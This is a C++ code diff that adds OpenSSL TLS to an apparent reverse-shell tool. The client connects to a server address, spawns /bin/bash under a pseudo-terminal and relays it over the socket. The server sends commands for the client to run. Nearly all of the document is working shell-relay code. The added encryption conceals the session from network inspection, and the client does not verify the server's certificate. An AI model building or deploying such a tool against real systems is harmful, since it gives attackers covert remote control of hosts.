@@ -1,5 +1,7 @@
 #include "utils.h"
 #include "args_parser.h"
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 // error msgs
 std::string pipeFailed = "[!] Pipe creation failed!";
@@ -8,6 +10,39 @@ std::string execlFailed = "[!] Execl failed!";
 std::string failedToOpenClientSoc = "[!] Failed to create client socket!";
 std::string serverDisconnected = "[!] Server Disconnected!";
 std::string failedToAcceptClient = "[!] Failed to accept incoming connection!";
+
+SSL_CTX* createServerCtx() {
+    // https://docs.openssl.org/master/man3/SSL_CTX_new/#synopsis
+    const SSL_METHOD *method = TLS_method(); // setting cipher/algorithm to be used (in this case the server ssl)
+    SSL_CTX* ctx = SSL_CTX_new(method);
+
+    if (!ctx) {
+        ERR_print_errors_fp(stderr);
+        exit(EXIT_FAILURE);
+    }
+    return ctx;
+}
+
+SSL_CTX* createClientContext() {
+    // https://docs.openssl.org/master/man3/SSL_CTX_new/#synopsis
+    const SSL_METHOD *method = TLS_method(); // setting cipher/algorithm to be used (in this case the server ssl)
+    SSL_CTX* ctx = SSL_CTX_new(method);
+
+    if (!ctx) {
+        ERR_print_errors_fp(stderr);
+        exit(EXIT_FAILURE);
+    }
+    return ctx;
+}
+
+void configureServerCtx(SSL_CTX* ctx) {
+    // load the cert and private key
+    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0
+        || SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0) {
+        ERR_print_errors_fp(stderr);
+        exit(EXIT_FAILURE);
+    }
+}
 
 // placeholder for now
 void server(const std::string &serverIpAddr, unsigned int portNum) {
@@ -42,11 +77,25 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
     socklen_t clientAddrLen = sizeof(clientAddr);
     char clientIpAddr[INET_ADDRSTRLEN];
 
+    OPENSSL_init_ssl(0, NULL);
+
     int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
+
+    SSL_CTX* ctx = createServerCtx();
+    configureServerCtx(ctx);
+
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, clientSocket);
+
+    if (SSL_accept(ssl) <= 0) {
+        ERR_print_errors_fp(stderr);
+    } else {
+        std::cout << "[+] TLS handshake successful!" << std::endl;
+    }
 
     // check we were able to accept connection from client
     if (clientSocket < 0) {
-        safeShutdown(failedToAcceptClient, serverSocket, clientSocket);
+        safeShutdown(failedToAcceptClient, serverSocket, clientSocket, ssl, ctx);
     }
 
     // get some info for server user
@@ -74,7 +123,7 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
         // Data from client -> server
         if (FD_ISSET(clientSocket, &fdSet)) {
             // read incoming data
-            ssize_t bytesReceived = recv(clientSocket, ttyBuffer, sizeof(ttyBuffer), 0);
+            ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
             // if no data, client has disconnected and we can exit
             if (bytesReceived <= 0) {
                 std::cout << "[!] Client disconnected" << std::endl;
@@ -95,14 +144,20 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
                 std::string inputCmd(ttyBuffer, input);
                 if (inputCmd.find("exit") != std::string::npos) {
                     // execute shutdown
-                    safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket);
+                    safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket, ssl, ctx);
                 }
 
                 // if not 'exit' send to client
-                send(clientSocket, ttyBuffer, input, 0);
+                SSL_write(ssl, ttyBuffer, input);
             }
         }
     }
+
+
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    EVP_cleanup();
+
     close(clientSocket);
     close(serverSocket);
 }
@@ -130,17 +185,28 @@ void client(const std::string &ipAddr, unsigned int portNum) {
         exit(-1);
     }
 
-    std::cout << "[+] Connected to server successfully" << std::endl;
+    OPENSSL_init_ssl(0, NULL);
+
+    SSL_CTX* ctx = createClientContext();
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, clientSocket);
+
+    if (SSL_connect(ssl) <= 0) {
+        ERR_print_errors_fp(stderr);
+    }
+    else {
+        std::cout << "[+] Connected to server with TLS!" << std::endl;
+    }
 
     int masterFd;
     pid_t childPid = forkpty(&masterFd, nullptr, nullptr, nullptr);
 
     if (childPid < 0) {
-        safeShutdown(forkFailed, clientSocket, masterFd);
+        safeShutdown(forkFailed, clientSocket, masterFd, ssl, ctx);
     }
     if (childPid == 0) {
         execl("/bin/bash", "bash", nullptr);
-        safeShutdown(execlFailed, clientSocket, masterFd);
+        safeShutdown(execlFailed, clientSocket, masterFd, ssl, ctx);
     }
 
     fd_set fds;
@@ -159,7 +225,7 @@ void client(const std::string &ipAddr, unsigned int portNum) {
 
         // from server to tty
         if (FD_ISSET(clientSocket, &fds)) {
-            ssize_t bytesReceived = recv(clientSocket, ttyBuffer, sizeof(ttyBuffer), 0);
+            ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
             if (bytesReceived <= 0) {
                 std::cout << serverDisconnected << std::endl;
                 break;
@@ -170,13 +236,19 @@ void client(const std::string &ipAddr, unsigned int portNum) {
         if (FD_ISSET(masterFd, &fds)) {
             ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
             if (n > 0) {
-                send(clientSocket, ttyBuffer, n, 0);
+
+                SSL_write(ssl, ttyBuffer, n);
             }
         }
     }
 
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    EVP_cleanup();
     close(clientSocket);
     close(masterFd);
+
+
     wait(nullptr);
 }
 
